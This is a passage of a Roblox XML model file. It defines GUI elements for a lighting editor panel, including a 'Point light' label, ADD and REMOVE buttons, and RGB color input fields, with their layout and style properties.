										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<string name="Name">Label</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>60</XO>
											<YS>0</YS>
											<YO>25</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<string name="Text">Point light</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">0.5</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">true</bool>
										<token name="TextXAlignment">0</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="ImageButton" referent="RBXFDE3DDEFF0244787B9E9631ABC45690A">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<Content name="Image"><url>http://www.mulrbx.com/asset/?id=134367382</url></Content>
										<Color3 name="ImageColor3">4294967295</Color3>
										<Vector2 name="ImageRectOffset">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Vector2 name="ImageRectSize">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<float name="ImageTransparency">0</float>
										<bool name="Modal">false</bool>
										<string name="Name">ArrowButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>10</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<token name="ScaleType">0</token>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>20</XO>
											<YS>0</YS>
											<YO>20</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<Rect2D name="SliceCenter">
											<min>
												<X>0</X>
												<Y>0</Y>
											</min>
											<max>
												<X>0</X>
												<Y>0</Y>
											</max>
										</Rect2D>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX433CCDF8D2294522ABA81FD1243B0BCE">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4292411647</Color3>
										<float name="BackgroundTransparency">0</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">ColorBar</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>3</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBX3DA4839EFBF340DBAF29F0754252790B">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">AddButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>1</XS>
											<XO>-40</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>35</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">ADD</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="TextButton" referent="RBXBC36BA99E02B4094875A4BE6EDBE00D9">
									<Properties>
										<bool name="Active">true</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<bool name="AutoButtonColor">true</bool>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4278190080</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<token name="Font">2</token>
										<token name="FontSize">4</token>
										<bool name="Modal">false</bool>
										<string name="Name">RemoveButton</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>90</XO>
											<YS>0</YS>
											<YO>3</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">true</bool>
										<bool name="Selected">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>0</XS>
											<XO>58</XO>
											<YS>0</YS>
											<YO>19</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<string name="Text">REMOVE</string>
										<Color3 name="TextColor3">4294967295</Color3>
										<bool name="TextScaled">false</bool>
										<float name="TextSize">12</float>
										<Color3 name="TextStrokeColor3">4278190080</Color3>
										<float name="TextStrokeTransparency">1</float>
										<float name="TextTransparency">0</float>
										<bool name="TextWrapped">false</bool>
										<token name="TextXAlignment">2</token>
										<token name="TextYAlignment">1</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBXA86FB8301E7B4B8DBF8E43838840E9A3">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4278190080</Color3>
										<float name="BackgroundTransparency">0.75</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Shadow</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>-1</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>1</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
								</Item>
								<Item class="Frame" referent="RBX27ABB8AC33144581A8CA0CBE6952A181">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4294967295</Color3>
										<float name="BackgroundTransparency">1</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">true</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">Options</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>3</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>-3</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">true</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBXA939D26CFD4C415FB529364578C6D878">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4288914085</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">ColorOption</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>10</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>25</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="TextLabel" referent="RBXA62CB39E99D84EE4884BBA1D3DD7DA79">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">Label</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>70</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Color</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">0</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX61C5F70F96C343B5B886F7B572B5DEB4">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">RInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>35</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX5673B16148074AB497EDDAE8DBB2014E">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXC6EE42697BF04AD496B415A2A3AA5F7F">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX027C53117D644E3DACFB82D6A3C93E05">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294901760</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX63BE9A2CE5C74E42A4C5423668B519B0">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBX7C11FE5D29D94832AB1B9334A6CDA0EA">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">GInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>72</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBX86A09AB3F2D94717AEEF72831FB859AD">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<bool name="AutoButtonColor">false</bool>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">0</token>
													<token name="FontSize">0</token>
													<bool name="Modal">false</bool>
													<string name="Name">TextButton</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<bool name="Selected">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<string name="Text"></string>
													<Color3 name="TextColor3">4279970357</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">8</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">2</int>
												</Properties>
											</Item>
											<Item class="ImageLabel" referent="RBXDB2CB5DC90A6442AB7CC93E19CA27C7A">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<Content name="Image"><url>http://www.mulrbx.com/asset/?id=127772502</url></Content>
													<Color3 name="ImageColor3">4294967295</Color3>
													<Vector2 name="ImageRectOffset">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Vector2 name="ImageRectSize">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<float name="ImageTransparency">0</float>
													<string name="Name">Background</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>0</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<token name="ScaleType">0</token>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>0</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<Rect2D name="SliceCenter">
														<min>
															<X>0</X>
															<Y>0</Y>
														</min>
														<max>
															<X>0</X>
															<Y>0</Y>
														</max>
													</Rect2D>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="Frame" referent="RBX00C9B3FCD2144BB5AA5261A11A1214EB">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4278255360</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">SelectedIndicator</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>3</XO>
														<YS>0</YS>
														<YO>-2</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-3</XO>
														<YS>0</YS>
														<YO>2</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextBox" referent="RBX0C4BD1A8F3414C698CDD5FDEFF0C369D">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4288914085</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClearTextOnFocus">true</bool>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<bool name="MultiLine">false</bool>
													<string name="Name">TextBox</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>5</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">true</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<bool name="ShowNativeInput">true</bool>
													<UDim2 name="Size">
														<XS>1</XS>
														<XO>-10</XO>
														<YS>1</YS>
														<YO>0</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">255</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">false</bool>
													<token name="TextXAlignment">2</token>
													<token name="TextYAlignment">1</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBXAF659742A11547FBA3455724D7815F09">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4288914085</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">BInput</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>109</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>38</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextButton" referent="RBXBCB8EFFBA6A84ACA8A46DBAA5E2D2C88">
												<Properties>
													<bool name="Active">true</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
